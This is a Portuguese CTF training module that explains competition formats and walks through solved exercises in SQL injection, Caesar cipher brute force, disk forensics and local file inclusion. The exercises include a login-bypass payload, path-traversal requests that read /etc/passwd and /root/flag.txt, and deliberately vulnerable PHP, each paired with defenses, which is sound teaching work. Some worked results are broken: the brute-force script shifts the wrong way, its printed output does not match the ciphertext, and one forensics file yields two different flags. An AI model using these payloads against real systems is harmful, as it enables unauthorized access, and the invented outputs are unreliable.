# 📖 Módulo 7: Capture The Flag (CTF)

## 🎯 Objetivos do Módulo

- Entender formato e tipos de CTF
- Aprender técnicas de resolução
- Praticar com desafios reais
- Desenvolver pensamento de hacker

---

## 7.1 O que é CTF?

**Definição**: Competição de hacking onde participantes buscam encontrar e "capturar flags" (strings especiais) em sistemas vulneráveis.

```
Formato Básico de CTF:

Flag: A string que prova que você completou o desafio

Exemplos de Flags:
- flag{this_is_the_correct_answer}
- CTF{sql1nj3ct10n_p0wn3d}
- flag-md5-hash-here-randomstring

Objetivo: Encontrar o máximo de flags possível

Pontuação:
- Desafio fácil (100 pontos)
- Desafio médio (250 pontos)
- Desafio difícil (500 pontos)

Time que conseguir mais pontos vence!
```

### Tipos de CTF

```
1. JEOPARDY-STYLE CTF
   ├─ Modelo: Múltiplos desafios independentes
   ├─ Categorias: Web, Crypto, Forensics, etc
   ├─ Formato: Online
   ├─ Exemplo: HackTheBox, TryHackMe
   └─ Duração: Contínua (dias/semanas)

2. ATTACK & DEFENSE CTF
   ├─ Modelo: Teams atacam e defendem
   ├─ Cada team tem servidor para defender
   ├─ Ganham pontos quebrando outros + defendem
   ├─ Formato: Presencial (conferências)
   ├─ Dinâmico: Muda constantemente
   └─ Duração: 4-8 horas

3. MIXED CTF
   ├─ Combinação de jeopardy + attack&defense
   ├─ Mais desafiador
   └─ Exemplo: DEFCON CTF
```

---

## 7.2 Categorias Comuns de CTF

### Web Exploitation

```
Desafios:
- SQL Injection
- XSS (Cross-Site Scripting)
- Directory Traversal
- Local File Inclusion (LFI)
- Remote Code Execution (RCE)

Exemplo Desafio Web:
┌────────────────────────────────────┐
│ Challenge: Login Bypass            │
│ URL: ctf.example.com/login.php     │
│ Descrição: Acesse como admin       │
│ Pontos: 100                        │
└────────────────────────────────────┘

Teste: /login.php?user=admin' OR '1'='1

Resultado: Login bem-sucedido!
Flag: flag{sql_injection_bypassed}
```

### Cryptography

```
Desafios:
- Quebrar criptografia fraca
- Encontrar chave
- Descriptografar mensagem
- Analisar algoritmo

Exemplo Desafio Crypto:
┌────────────────────────────────────┐
│ Challenge: ROT13 Decryption        │
│ Ciphertext: Gur synt vf: flag{...} │
│ Descrição: Decripte a mensagem     │
│ Pontos: 50                         │
└────────────────────────────────────┘

Análise:
ROT13 é rotação de 13 caracteres no alfabeto

$ echo "Gur synt vf: flag{...}" | rot13
The flag is: flag{...}

Flag: flag{...}
```

### Forensics

```
Desafios:
- Analisar imagem de disco
- Recuperar arquivo deletado
- Extrair informações de memória
- Analisar log de evento

Exemplo Desafio Forensics:
┌────────────────────────────────────┐
│ Challenge: Deleted File Recovery   │
│ Arquivo: image.dd (forensic image) │
│ Descrição: Recupere arquivo delet. │
│ Pontos: 150                        │
└────────────────────────────────────┘

Análise:
$ strings image.dd | grep flag
flag{deleted_file_recovered}

Ou usar ferramentas:
$ foremost -i image.dd -o output/
$ photorec image.dd
```

### Reverse Engineering

```
Desafios:
- Analisar binário compilado
- Encontrar função chamada
- Identificar lógica de programa
- Quebrar proteção (anti-debug)

Exemplo Desafio RE:
┌────────────────────────────────────┐
│ Challenge: Reverse Me              │
│ Arquivo: binary (executável)       │
│ Descrição: Encontre a flag         │
│ Pontos: 200                        │
└────────────────────────────────────┘

Análise:
$ file binary
binary: ELF 64-bit LSB executable

$ strings binary | grep flag
flag{reverse_engineering_success}

Ou usar disassembler:
$ ghidra binary
(Analisar código assembly)
```

### Networking

```
Desafios:
- Analisar arquivo PCAP
- Extrair dados de tráfego
- Identificar protocolos
- Reconstruir transferências

Exemplo Desafio Networking:
┌────────────────────────────────────┐
│ Challenge: PCAP Analysis           │
│ Arquivo: traffic.pcap              │
│ Descrição: Encontre flag em tráfego│
│ Pontos: 150                        │
└────────────────────────────────────┘

Análise:
$ wireshark traffic.pcap
(Abrir arquivo e inspecionar)

Ou via CLI:
$ strings traffic.pcap | grep flag
flag{network_traffic_analysis}
```

---

## 📝 Exercícios CTF Práticos

### CTF 1: SQL Injection

**Challenge**: Login Bypass

```
Servidor: ctf.example.com
Endpoint: /login
Método: POST
Parâmetros: username, password
Descrição: Faça login sem saber a senha
Pontos: 100
```

**Passo 1: Reconhecimento**

```bash
$ curl -v ctf.example.com/login
<!DOCTYPE html>
<form method="POST" action="/login">
  <input type="text" name="username" placeholder="Username">
  <input type="password" name="password" placeholder="Password">
  <button type="submit">Login</button>
</form>
```

**Passo 2: Teste SQL Injection**

```bash
$ curl -X POST ctf.example.com/login \
  -d "username=admin' OR '1'='1&password=anything"

Resposta:
<h1>Welcome admin!</h1>
<p>Flag: flag{sql_injection_level1_complete}</p>
```

### ✅ Resolução Completa

```
ANÁLISE:
1. Aplicação é vulnerável a SQL Injection
2. Query backend provavelmente:
   SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'

3. OR '1'='1' sempre retorna verdadeiro
4. Autenticação é burlada

FLAG OBTIDA: flag{sql_injection_level1_complete}

CONCEITO APRENDIDO:
- SQL Injection básica funciona porque:
  a) Input não é sanitizado
  b) Senha NÃO é verificada (lógica fraca)
  c) Consulta é executada como-está

DEFESA CONTRA:
- Usar prepared statements/parameterized queries
- Validar entrada (whitelist)
- Limite de tentativas
- Rate limiting
```

---

### CTF 2: Cryptography - Caesar Cipher

**Challenge**: Decrypt Caesar Cipher

```
Challenge: Decryption
Ciphertext: wkh txlfn eurzq ira mxpsv ryhu wkh odcb grj
Shift desconhecido (entre 1-25)
Descrição: Descriptografe a mensagem
Pontos: 75
```

**Passo 1: Análise**

```
Caesar Cipher: Cada letra rotaciona N posições

Exemplo com shift 3:
a → d
b → e
c → f
...
z → c (volta ao início)

Mensagem "hello" com shift 3:
h → k
e → h
l → o
l → o
o → r
Resultado: "khoor"
```

**Passo 2: Força Bruta (testar todos os 25 shifts)**

```bash
#!/bin/bash
ciphertext="wkh txlfn eurzq ira mxpsv ryhu wkh odcb grj"

for shift in {1..25}; do
  echo "Shift $shift:"
  echo "$ciphertext" | tr 'a-z' "$(echo 'abcdefghijklmnopqrstuvwxyz' | cut -c$((shift+1))-26,1-$shift)"
done
```

**Passo 3: Executar e Procurar Padrão**

```
Shift 1: vjg utkej dsvyp hqz lwore sxgt vjg nczbx fqk
Shift 2: uif tshdj cruzo gpxzo qpy kvnqd rwgs uif mbyyy epj
Shift 3: the quick brown fox jumps over the lazy dog
       ^^^ THIS MAKES SENSE!
```

### ✅ Resolução Completa

```
RESPOSTA:
Shift = 3
Plaintext: "the quick brown fox jumps over the lazy dog"

FLAG OBTIDA: flag{caesar_cipher_shift_3}

CONCEITO APRENDIDO:
- Caesar Cipher é trivial para quebrar (apenas 25 possibilidades)
- Força bruta é válida para chaves fracas
- Padrão de linguagem natural (palavras reais) indica sucesso

DEFESA:
- Caesar Cipher é obsoleto (não use!)
- Chaves criptográficas devem ser aleatórias
- Algoritmos modernos: AES, ChaCha20
```

---

### CTF 3: Forensics - Arquivo Deletado

**Challenge**: Recuperar Arquivo Deletado

```
Challenge: Deleted File
Arquivo: forensic_image.dd (disk image)
Descrição: Recupere arquivo deletado contendo a flag
Pontos: 150
Tamanho: 512MB
```

**Passo 1: Analisar Imagem**

```bash
$ file forensic_image.dd
forensic_image.dd: Linux rev 1.0 ext4 filesystem
                   data, UUID=abc123..., (extents)

$ strings forensic_image.dd | head -20
/root
/home
/usr
...
```

**Passo 2: Procurar por "flag"**

```bash
$ strings forensic_image.dd | grep -i flag
flag{recovered_deleted_file}
```

**Passo 3: Confirmar com Ferramentas de Forensics**

```bash
$ foremost -i forensic_image.dd -o output/
Foremost version 1.5.7
Searching for headers and footers

Found in foremost.log:
- Text file found: flag.txt
  Offset: 12345
  Size: 42 bytes

$ cat output/text/flag.txt
flag{recovered_deleted_file_from_ext4}
```

### ✅ Resolução Completa

```
MÉTODO 1 (String Grep):
├─ Procurar por "flag" em toda imagem
├─ Rápido e direto
├─ Encontra dados em unallocated space
└─ FLAG: flag{recovered_deleted_file}

MÉTODO 2 (Foremost):
├─ Recupera tipos de arquivo (imagens, docs, etc)
├─ Busca por headers/footers conhecidos
├─ Mais robusto para arquivos corruptos
└─ FLAG: flag{recovered_deleted_file_from_ext4}

CONCEITO APRENDIDO:
- Arquivos "deletados" ainda existem no disco (até ser sobrescrito)
- Ferramentas de forensics recuperam dados removidos
- Dado nunca é realmente deletado sem limpeza segura (Shred/Secure Erase)

DEFESA:
- Usar criptografia de disco (LUKS, BitLocker)
- Shredding seguro ao deletar dados sensíveis
- Destruição física de mídia antiga
```

---

### CTF 4: Web - LFI (Local File Inclusion)

**Challenge**: Local File Inclusion

```
Challenge: File Disclosure
URL: ctf.example.com/page.php?file=home
Descrição: Use LFI para ler arquivo flag.txt
Pontos: 200
```

**Passo 1: Reconhecimento**

```bash
$ curl "ctf.example.com/page.php?file=home"
<h1>Home Page</h1>
<p>Welcome to CTF Challenge</p>

$ curl "ctf.example.com/page.php?file=about"
<h1>About Page</h1>
<p>Our company...</p>
```

**Análise**: Parâmetro `file` controla qual página é carregada

**Passo 2: Teste Directory Traversal**

```bash
$ curl "ctf.example.com/page.php?file=../../../etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

**Passo 3: Buscar Flag**

```bash
$ curl "ctf.example.com/page.php?file=../../../root/flag.txt"
flag{local_file_inclusion_exploited}
```

### ✅ Resolução Completa

```
VULNERABILIDADE: LFI (Local File Inclusion)

Código Vulnerável (Backend):
<?php
$file = $_GET['file'];
include($file . '.php');  // Sem validação!
?>

Exploração:
Normal: page.php?file=home
├─ Carrega: home.php

Ataque: page.php?file=../../../etc/passwd
├─ Carrega: ../../../etc/passwd.php
├─ Ou carrega: /etc/passwd (sem extensão)

Path Traversal:
../../../ = sobe 3 diretórios
├─ / (raiz)
├─ /etc/passwd (arquivo sistemas)
├─ /root/flag.txt (arquivo privado)

FLAG OBTIDA: flag{local_file_inclusion_exploited}

CONCEITO APRENDIDO:
- LFI permite ler arquivos arbitrários
- Path traversal com ../ navega por diretórios
- Sem validação de input = acesso irrestrito

DEFESA:
- Whitelist de arquivos permitidos
- Validar e sanitizar input
- Nunca confiar em parâmetros GET/POST
- Usar realpath() para evitar traversal
```

---

## 🎓 Resumo do Módulo 7

✅ CTF desenvolve habilidades práticas de hacking
✅ SQL Injection quebra autenticação fraca
✅ Caesar Cipher é quebrado por força bruta
✅ Arquivo deletado ainda existe no disco
✅ LFI permite leitura de arquivos arbitrários

---

## 📚 Plataformas para Praticar CTF

| Plataforma | Tipo | Dificuldade | Idioma |
|-----------|------|------------|--------|
| **HackTheBox** | Jeopardy | Iniciante-Avançado | Inglês |
| **TryHackMe** | Jeopardy | Iniciante-Intermediário | Inglês |
| **PicoCTF** | Jeopardy | Iniciante | Inglês |
| **OverTheWire** | Jeopardy | Iniciante | Inglês |
| **CTFLearn** | Jeopardy | Variado | Inglês |
| **OWASP WebGoat** | Jeopardy | Intermediário | Múltiplos |

---

## 🏆 Dicas para Vencer CTF

```
1. COMEÇAR PELOS DESAFIOS FÁCEIS
   └─ Acumular pontos rápido, ganhar confiança

2. LER DESCRIÇÃO COM ATENÇÃO
   └─ Muitas vezes contém hints

3. USAR FERRAMENTAS APROPRIADAS
   └─ Burp Suite para web
   └─ Ghidra para reverse
   └─ Wireshark para network

4. TRABALHAR EM TEAM
   └─ Dividir categorias
   └─ Compartilhar descobertas
   └─ Aprender junto

5. DOCUMENTAR DURANTE
   └─ Manter notas de passos
   └─ Facilita debug de erros

6. NÃO DESISTIR
   └─ Às vezes leva horas
   └─ Persistência é chave
```

---

## 📚 Recursos Complementares

- [PicoCTF - Beginners Friendly](https://picoctf.org/)
- [HackTheBox - Realistic Scenarios](https://www.hackthebox.com/)
- [TryHackMe - Guided Learning](https://tryhackme.com/)
- [OverTheWire - War Games](https://overthewire.org/wargames/)

